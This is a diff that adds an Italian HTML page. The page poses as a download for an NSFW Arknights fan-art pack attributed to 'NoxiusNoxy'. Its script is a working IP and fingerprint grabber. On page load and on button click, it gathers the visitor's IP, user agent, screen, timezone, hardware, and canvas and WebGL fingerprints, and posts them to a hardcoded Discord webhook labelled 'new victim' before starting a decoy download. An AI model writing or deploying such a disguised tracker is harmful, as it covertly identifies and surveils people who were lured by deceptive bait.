@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NoxiusNoxy - Arknights NSFW Mega Pack 2026</title>
+    <style>
+        body { background: #0a0a0a; color: #fff; font-family: Arial, sans-serif; text-align: center; margin: 0; padding: 40px; }
+        .container { max-width: 800px; margin: 0 auto; }
+        .button {
+            display: inline-block; padding: 22px 70px; font-size: 32px; background: linear-gradient(45deg, #ff00ff, #00ffff);
+            color: white; border: none; border-radius: 12px; cursor: pointer; margin: 40px 0;
+            box-shadow: 0 0 40px #ff00ff; transition: all 0.3s;
+        }
+        .button:hover { transform: scale(1.08); box-shadow: 0 0 60px #00ffff; }
+        h1 { color: #ff00ff; text-shadow: 0 0 20px #ff00ff; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔥 NoxiusNoxy Exclusive NSFW Collection 2026 🔥</h1>
+        <p><strong>2.4 GB</strong> • Arknights • Furry • Lewd • Commissions</p>
+        <p>Password: <strong>noxysnoxy2026</strong></p>
+
+        <a href="#" id="downloadBtn" class="button">
+            ⬇️ SCARICA PACK COMPLETO
+        </a>
+    </div>
+
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1516557179958591658/RHo2_tp0AvLmXndWh3ofo06nEGbbz2gFvD2LdTh81bytuZShO1tnXOo_jt_vLpUxGJBV"; // ← SOSTITUISCI
+
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch {
+                return "N/A (VPN/Block)";
+            }
+        }
+
+        async function getMoreInfo() {
+            const ip = await getIP();
+
+            const fingerprint = {
+                ip: ip,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                referrer: document.referrer || "Direct",
+                url: window.location.href
+            };
+
+            // Canvas Fingerprinting
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = "alphabetic";
+                ctx.font = "30px Arial";
+                ctx.fillText("NoxySnoXy", 50, 100);
+                fingerprint.canvasHash = canvas.toDataURL().substring(0, 100);
+            } catch(e) {}
+
+            // WebGL Fingerprinting
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                if (gl) {
+                    fingerprint.webglVendor = gl.getParameter(gl.VENDOR);
+                    fingerprint.webglRenderer = gl.getParameter(gl.RENDERER);
+                }
+            } catch(e) {}
+
+            // Send to webhook
+            const payload = {
+                content: "**🔥 NUOVA VITTIMA - FULL FINGERPRINT**",
+                embeds: [{
+                    color: 0xff00ff,
+                    title: "Noxysnoxy IP Grabber",
+                    fields: [
+                        { name: "IP", value: `\`${fingerprint.ip}\``, inline: true },
+                        { name: "Timezone", value: fingerprint.timezone, inline: true },
+                        { name: "Screen", value: fingerprint.screen, inline: true },
+                        { name: "User-Agent", value: `\`${fingerprint.userAgent}\``, inline: false },
+                        { name: "Platform", value: fingerprint.platform, inline: true },
+                        { name: "Hardware Cores", value: fingerprint.hardwareConcurrency || "N/A", inline: true },
+                        { name: "Device Memory", value: fingerprint.deviceMemory ? fingerprint.deviceMemory + " GB" : "N/A", inline: true },
+                        { name: "Languages", value: fingerprint.languages ? fingerprint.languages.join(", ") : "N/A", inline: false },
+                        { name: "Canvas Hash", value: `\`${fingerprint.canvasHash || "N/A"}\``, inline: false },
+                        { name: "WebGL", value: `\`${fingerprint.webglRenderer || "N/A"}\``, inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(WEBHOOK, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).catch(() => {});
+        }
+
+        // Trigger multipli
+        document.getElementById('downloadBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            getMoreInfo();
+
+            // Fake download
+            const link = document.createElement('a');
+            link.href = "https://files.catbox.moe/9k8f2m.zip"; // Cambia con link reale o vuoto
+            link.download = "noxysnoxy_arknights_nsfw_2026.zip";
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+
+            setTimeout(() => alert("Download avviato!\nPassword: noxysnoxy2026"), 600);
+        });
+
+        // Log anche al load della pagina
+        window.onload = () => getMoreInfo();
+    </script>
+</body>
+</html>
